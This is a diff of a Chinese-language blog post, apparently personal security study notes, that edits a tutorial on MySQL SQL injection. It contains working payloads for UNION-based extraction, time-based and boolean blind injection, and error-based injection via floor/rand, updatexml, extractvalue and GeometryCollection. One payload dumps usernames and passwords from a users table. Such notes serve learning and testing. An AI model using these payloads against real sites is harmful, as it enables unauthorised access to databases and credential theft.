@@ -1,6 +1,6 @@
 ---
 layout:     post
-title:      Web笔记（一）SQL注入（MySQL）
+title:      Web笔记（一）SQL注入之MySQL
 subtitle:   这个系列是整理学习安全的笔记，包括Web和PWN的一些知识。本章是MySQL的SQL注入。
 date:       2020-11-26
 author:     HouKC
@@ -75,14 +75,14 @@ id=jack
 id=ja'+'ck
 ```
 
-- 如果以下两个请求结果相同，则很可能存在SQL注入漏洞，且数据库为ORACLE。
+- 如果以下两个请求结果相同，则很可能存在SQL注入漏洞，且数据库为Oracle。
 
 ```
 id=jack
 id=ja'||'ck
 ```
 
-- 如果以下两个请求结果相同，则很可能存在SQL注入漏洞，且数据库为MYSQL。
+- 如果以下两个请求结果相同，则很可能存在SQL注入漏洞，且数据库为MySQL。
 
 ```
 id=jack
@@ -108,13 +108,13 @@ id=-1' order by 3 -- -
 
 - \' 号前用1或者其他的，也可以置空，视注入语句需要的情况而定，如果是需要前面为真，则需要id等于一个存在的值，如果是要假，则找一个不存在的值即可。
 
-- 最后面的“\-\- -”(注意中间有空格)是用来注释的，也可以用“\-\-\+”或“\#”。
+- 最后面的 “\-\- -” （注意中间有空格）是用来注释的，也可以用 “\-\-\+” 或 “\#” 。
 
 上面这些是用来测试使用了多少个字段，知道了字段数之后可以进行的数据库信息查询。
 
 ```
 id=-1' union select 1, database() -- -		# 输出当前数据库名
-id=-1' union select 1, user() -- -			# 输出当前用户名
+id=-1' union select 1, user() -- -		# 输出当前用户名
 id=-1' union select 1, version() -- -		# 输出数据库版本信息
 ```
 如果需要输出的字段比原来输出的少，可以用下面这句进行拼接输出，利用concat或group_concat函数进行拼接。
@@ -156,7 +156,7 @@ id=-1' union select [列名] from [表名] -- -
 
 盲注是注入攻击的一种，向数据库发送true或false这样的问题，并根据应用程序返回的信息判断结果，这种攻击的出现是因为应用程序配置为只显示常规错误，但并没有解决SQL注入存在的代码问题。
 
-1. 基于时间的盲注
+#### 1. 基于时间的盲注
 
 ```
 id=1' and if(ascii(substr(database(),0,1))<N, sleep(3), 1) -- -
@@ -178,9 +178,7 @@ id=1' and (select if(length(database())>N, sleep(5), null) -- -
 id=-1' or (length(database()))>N or if(1=1, sleep(5), null) or '1'='1 
 ```
 
-
-
-2. 基于布尔的盲注
+#### 2.  基于布尔的盲注
 
 ```
 id=1' and length(database()) -- -
@@ -212,20 +210,22 @@ id=1' and ascii(substr(database(), 0, 1))<N -- -
 
 获取数据库
 ```
-0' union select 1,2,3 from (select count(*),concat((select concat(version(),0x3a,0x3a,database(),0x3a,0x3a,user(),0x3a) limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a -- -
+id=-1' union select 1,2,3 from (select count(*),concat((select concat(version(),0x3a,0x3a,database(),0x3a,0x3a,user(),0x3a) limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a -- -
 ```
 
 获取表名
 ```
-0' union select 1,2,3 from (select count(*),concat((select concat(table_name,0x3a,0x3a) from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a -- -
+id=-1' union select 1,2,3 from (select count(*),concat((select concat(table_name,0x3a,0x3a) from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a -- -
 ```
 
 获取用户信息
 ```
-0' union select 1,2,3 from (select count(*),concat((select concat(username,0x3a,0x3a,password,0x3a,0x3a) from security.users limit 1,1), floor(rand(0)*2))x from information_schema.tables group by x)a -- -
+id=-1' union select 1,2,3 from (select count(*),concat((select concat(username,0x3a,0x3a,password,0x3a,0x3a) from security.users limit 1,1), floor(rand(0)*2))x from information_schema.tables group by x)a -- -
 ```
 
 #### 2. updatexml报错注入
+
+MySQL 大于等于5.1.5才能用updatexml报错注入。
 
 updatexml(xml_document, xpath_string, new_value)
 
@@ -279,11 +279,17 @@ id=-1' or updatexml(1, concat(0x7e, version(), 0x7e), 1) -- -
 
 #### 3. extractvalue报错注入
 
+MySQL 大于等于5.1.5才能extractvalue报错注入。
+
 ```
-1' and extractvalue(1,concat(0x7e,database(),0x7e)) -- -
+id=1' and extractvalue(1,concat(0x7e,database(),0x7e)) -- -
 ```
 
+#### 4. GeometryCollection报错注入
 
+```
+id=1' and GeometryCollection((select * from(select * from(select user())a)b)) -- -
+```
 
 ## 0x07 宽字节注入
 
